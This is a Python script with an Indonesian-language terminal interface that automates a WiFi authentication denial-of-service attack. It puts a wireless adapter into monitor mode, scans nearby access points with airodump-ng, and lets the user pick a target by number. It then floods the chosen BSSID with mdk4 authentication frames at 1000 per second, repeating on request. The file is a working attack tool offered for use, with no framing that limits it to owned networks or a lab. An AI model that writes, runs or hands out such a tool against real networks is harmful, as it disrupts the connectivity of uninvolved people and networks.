#!/usr/bin/env python3
import csv
import glob
import os
import random
import re
import subprocess
import sys
import tempfile
import time

# ---------- ANSI ----------
RESET = "\033[0m"
BOLD = "\033[1m"
CLEAR = "\033[2J\033[H"

COLORS = {
    "green": "\033[92m",
    "red": "\033[91m",
    "cyan": "\033[96m",
    "yellow": "\033[93m",
    "magenta": "\033[35m",
    "gray": "\033[90m",
}

GREEN = COLORS["green"]
RED = COLORS["red"]
CYAN = COLORS["cyan"]
YELLOW = COLORS["yellow"]
MAGENTA = COLORS["magenta"]
GRAY = COLORS["gray"]

BOX_WIDTH = 46

# ================= CLEAR & DRAW BOX =================

def clear_screen():
    sys.stdout.write(CLEAR)
    sys.stdout.flush()

def draw_box_top(color=CYAN):
    print(f"\n  {color}{BOLD}╔{'═' * BOX_WIDTH}╗{RESET}")

def draw_box_bottom(color=CYAN):
    print(f"  {color}{BOLD}╚{'═' * BOX_WIDTH}╝{RESET}")

def draw_box_title(title: str, color=CYAN, text_color=YELLOW):
    inner = f" {title}"
    pad = BOX_WIDTH - len(inner)
    if pad < 0:
        inner = inner[:BOX_WIDTH]
        pad = 0
    print(
        f"  {color}{BOLD}║{RESET}"
        f"{text_color}{BOLD}{inner}{RESET}"
        f"{' ' * pad}"
        f"{color}{BOLD}║{RESET}"
    )

def draw_box_line(text: str, color=GRAY):
    pad = BOX_WIDTH - len(text)
    if pad < 0:
        text = text[:BOX_WIDTH]
        pad = 0
    print(
        f"  {color}{BOLD}║{RESET}"
        f"{text}{RESET}"
        f"{' ' * pad}"
        f"{color}{BOLD}║{RESET}"
    )

# ================= LOADING =================

def loading_spinner(text, duration=1):
    chars = "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"
    for i in range(duration * 10):
        sys.stdout.write(f"\r  {YELLOW}{BOLD}{chars[i % len(chars)]} {text}{RESET}")
        sys.stdout.flush()
        time.sleep(0.1)
    sys.stdout.write("\r" + " " * 60 + "\r")
    sys.stdout.flush()

def loading_dots(text, duration):
    for _ in range(duration):
        for d in range(4):
            sys.stdout.write(f"\r  {CYAN}[*] {text}{'.' * d}   {RESET}")
            sys.stdout.flush()
            time.sleep(0.3)
    sys.stdout.write("\r" + " " * 60 + "\r")
    sys.stdout.flush()

# ================= WIRELESS =================

def get_wireless_interfaces():
    output = subprocess.run(["ip", "link"], capture_output=True, text=True).stdout
    interfaces = []
    for line in output.splitlines():
        m = re.match(r"^\d+:\s+(\S+):", line)
        if m:
            name = m.group(1)
            if name == "lo":
                continue
            interfaces.append(name)
    return interfaces

def get_monitor_interface_name(adapter, output):
    current_ifaces = get_wireless_interfaces()
    for iface in current_ifaces:
        if iface != adapter and iface.endswith("mon"):
            return iface

    match = re.search(r"\[(?:phy\d+)\]([A-Za-z0-9_.:-]+mon)\b", output, re.IGNORECASE)
    if match:
        return match.group(1)

    match = re.search(r"\b([A-Za-z0-9_.:-]+mon)\b", output, re.IGNORECASE)
    if match:
        return match.group(1)

    try:
        iw_output = subprocess.run(["iw", "dev"], capture_output=True, text=True).stdout
        for line in iw_output.splitlines():
            m = re.search(r"\bInterface\s+(\S+)", line)
            if m:
                iface = m.group(1)
                if iface != adapter and iface.endswith("mon"):
                    return iface
    except FileNotFoundError:
        pass

    return f"{adapter}mon"

def start_monitor_mode(adapter):
    loading_spinner(f"Mengaktifkan monitor mode pada {adapter}...", 2)
    subprocess.run(["sudo", "airmon-ng", "check", "kill"], 
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    result = subprocess.run(["sudo", "airmon-ng", "start", adapter],
                            capture_output=True, text=True)
    if result.returncode != 0:
        return adapter
    output = (result.stdout or "") + (result.stderr or "")
    monitor_iface = get_monitor_interface_name(adapter, output)
    time.sleep(0.3)
    return monitor_iface

def scan_networks(adapter, duration=10):
    clear_screen()
    draw_box_top(CYAN)
    draw_box_title("SCAN WIFI", CYAN, YELLOW)
    draw_box_bottom(CYAN)
    print()

    loading_dots("Scanning WiFi networks", duration)

    temp_dir = tempfile.mkdtemp(prefix="airodump-", dir="/tmp")
    prefix = os.path.join(temp_dir, "scan")
    proc = subprocess.Popen(
        ["sudo", "airodump-ng", "--write", prefix, "--output-format", "csv", adapter],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    time.sleep(duration)

    if proc.poll() is None:
        proc.terminate()
        try:
            proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            proc.kill()
            proc.wait()

    networks = []
    seen = set()
    for csv_path in sorted(glob.glob(prefix + "-*.csv")):
        with open(csv_path, newline="", encoding="utf-8", errors="ignore") as handle:
            reader = csv.reader(handle)
            for row in reader:
                if len(row) < 14:
                    continue
                bssid = row[0].strip()
                channel = row[3].strip()
                essid = row[13].strip()
                if not bssid or bssid.lower() == "bssid" or not essid:
                    continue
                key = (bssid, channel, essid)
                if key in seen:
                    continue
                seen.add(key)
                networks.append({"bssid": bssid, "channel": channel, "essid": essid})

    for path in glob.glob(prefix + "-*.csv"):
        try:
            os.remove(path)
        except OSError:
            pass
    try:
        os.rmdir(temp_dir)
    except OSError:
        pass

    return networks

def stop_monitor_mode(monitor_iface):
    loading_spinner("Membersihkan monitor mode...", 1)
    candidates = [monitor_iface]
    if monitor_iface.endswith("mon"):
        candidates.append(monitor_iface[:-3])
    else:
        candidates.append(f"{monitor_iface}mon")

    for name in candidates:
        subprocess.run(["sudo", "airmon-ng", "stop", name],
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(["sudo", "systemctl", "restart", "NetworkManager"],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

# ================= SELECT INTERFACE & TARGET =================

def select_interface():
    clear_screen()
    draw_box_top(CYAN)
    draw_box_title("AUTH DOS ATTACK", CYAN, YELLOW)
    draw_box_bottom(CYAN)

    loading_spinner("Scanning interfaces...", 1)
    ifaces = get_wireless_interfaces()
    if not ifaces:
        print(f"\n  {RED}[✗] Tidak ada interface ditemukan.{RESET}")
        sys.exit(1)

    print(f"\n  {BOLD}Pilih interface:{RESET}")
    for idx, name in enumerate(ifaces, start=1):
        print(f"  {GREEN}{idx}.{RESET} {name}")

    while True:
        choice = input(f"\n  {YELLOW}>> nomor : {RESET}").strip()
        if choice.isdigit() and 1 <= int(choice) <= len(ifaces):
            selected = ifaces[int(choice) - 1]
            print(f"  {GREEN}LOCKED: {selected}{RESET}")
            time.sleep(0.3)
            clear_screen()
            return selected
        print(f"  {RED}[!] Input salah, coba lagi.{RESET}")

def select_target(networks):
    if not networks:
        print(f"\n  {RED}[✗] Tidak ada jaringan ditemukan.{RESET}")
        return None

    clear_screen()
    draw_box_top(CYAN)
    draw_box_title("PILIH TARGET", CYAN, YELLOW)
    draw_box_bottom(CYAN)

    header = f"{'No':<3} {'ESSID':<22} {'CH':<3} {'BSSID'}"
    print(f"\n  {header}")
    print(f"  {YELLOW}{'=' * 50}{RESET}")

    for idx, net in enumerate(networks, start=1):
        essid = net["essid"][:22]
        print(f"  {GREEN}{idx:<3}{RESET} {essid:<22} {net['channel']:<3} {net['bssid']}")

    while True:
        choice = input(f"\n  {YELLOW}>> nomor target : {RESET}").strip()
        if choice.isdigit() and 1 <= int(choice) <= len(networks):
            selected = networks[int(choice) - 1]
            print(f"  {GREEN}TARGET LOCKED: {selected['essid']}{RESET}")
            time.sleep(0.3)
            return selected
        print(f"  {RED}[!] Input salah, coba lagi.{RESET}")

# ================= ATTACK =================

def run_attack(target, monitor_iface):
    clear_screen()
    draw_box_top(RED)
    draw_box_title("AUTH DOS ATTACK", RED, YELLOW)
    draw_box_bottom(RED)

    draw_box_line(f"  [*] Target  : {target['essid']}", CYAN)
    draw_box_line(f"  [*] BSSID   : {target['bssid']}", CYAN)
    draw_box_line(f"  [*] Channel : {target['channel']}", CYAN)
    draw_box_line(f"  [!] Tekan Ctrl+C untuk menghentikan", YELLOW)
    draw_box_bottom(RED)

    print()

    # Airodump-ng di background (dihide)
    dump_cmd = [
        "sudo", "airodump-ng",
        "--bssid", target["bssid"],
        "-c", target["channel"],
        monitor_iface
    ]
    print(f"  {YELLOW}Menjalankan airodump-ng untuk target...{RESET}")
    print(f"  {GRAY}{' '.join(dump_cmd)}{RESET}")
    dump_proc = subprocess.Popen(dump_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(1)

    # MDK4 auth dos – OUTPUT TETAP DERES (tidak dihide)
    mdk4_cmd = [
        "sudo", "mdk4", monitor_iface, "a",
        "-a", target["bssid"],
        "-s", "1000"
    ]
    print(f"\n  {YELLOW}Menjalankan mdk4 auth dos...{RESET}")
    print(f"  {GRAY}{' '.join(mdk4_cmd)}{RESET}")
    print(f"  {GRAY}{'=' * 50}{RESET}\n")

    try:
        # Biarkan output MDK4 mengalir ke terminal
        subprocess.run(mdk4_cmd)
    except KeyboardInterrupt:
        print(f"\n  {YELLOW}[!] Keyboard interrupt diterima. Menghentikan serangan...{RESET}")
    finally:
        if dump_proc.poll() is None:
            dump_proc.terminate()
            try:
                dump_proc.wait(timeout=3)
            except subprocess.TimeoutExpired:
                dump_proc.kill()
                dump_proc.wait()

# ================= POST ATTACK MENU =================

def prompt_post_attack():
    print(f"\n  {BOLD}Pilih opsi:{RESET}")
    print(f"  {GREEN}1.{RESET} Attack Again")
    print(f"  {GREEN}0.{RESET} Back to Menu")
    print(f"  {GREEN}99.{RESET} Exit")

    while True:
        choice = input(f"\n  {YELLOW}>> pilihan : {RESET}").strip()
        if choice == "1":
            return "again"
        elif choice == "0":
            return "menu"
        elif choice == "99":
            return "exit"
        else:
            print(f"  {RED}[!] Pilih 1, 0, atau 99.{RESET}")

def back_to_mdk4_menu():
    script_dir = os.path.dirname(os.path.abspath(__file__))
    menu_path = os.path.join(script_dir, "mdk4-menu.py")
    possible = [menu_path,
                os.path.join(script_dir, "..", "mdk4-menu.py"),
                os.path.join(script_dir, "..", "..", "mdk4-menu.py")]
    for p in possible:
        if os.path.exists(p):
            os.execvp(sys.executable, [sys.executable, p])
            return
    print(f"\n  {RED}[✗] mdk4-menu.py tidak ditemukan.{RESET}")
    input("\n  Tekan Enter untuk kembali...")
    sys.exit(0)

# ================= MAIN =================

def main():
    monitor_iface = None

    while True:
        try:
            # Pilih interface
            adapter = select_interface()
            monitor_iface = start_monitor_mode(adapter)

            # Tanya durasi scan
            clear_screen()
            draw_box_top(CYAN)
            draw_box_title("SCAN WIFI", CYAN, YELLOW)
            draw_box_bottom(CYAN)
            print(f"\n  {YELLOW}Mau scan berapa detik? (default 10){RESET}")
            scan_input = input(f"  {YELLOW}>> detik : {RESET}").strip()
            scan_duration = int(scan_input) if scan_input.isdigit() and int(scan_input) > 0 else 10

            networks = scan_networks(monitor_iface, duration=scan_duration)
            target = select_target(networks)

            if target is None:
                print(f"\n  {RED}[✗] Tidak ada target.{RESET}")
                stop_monitor_mode(monitor_iface)
                back_to_mdk4_menu()
                return

            run_attack(target, monitor_iface)

            # Setelah serangan selesai (atau dihentikan)
            print("\n  Membersihkan sesi...")
            stop_monitor_mode(monitor_iface)

            while True:
                post = prompt_post_attack()
                if post == "again":
                    monitor_iface = None
                    break
                elif post == "menu":
                    back_to_mdk4_menu()
                elif post == "exit":
                    clear_screen()
                    print(f"\n  {GREEN}[✓] Terima kasih!{RESET}")
                    sys.exit(0)

        except KeyboardInterrupt:
            print(f"\n  {YELLOW}[!] Keyboard interrupt diterima.{RESET}")
            if monitor_iface:
                stop_monitor_mode(monitor_iface)
            print("  Keluar dari program.")
            sys.exit(0)

if __name__ == "__main__":
    main()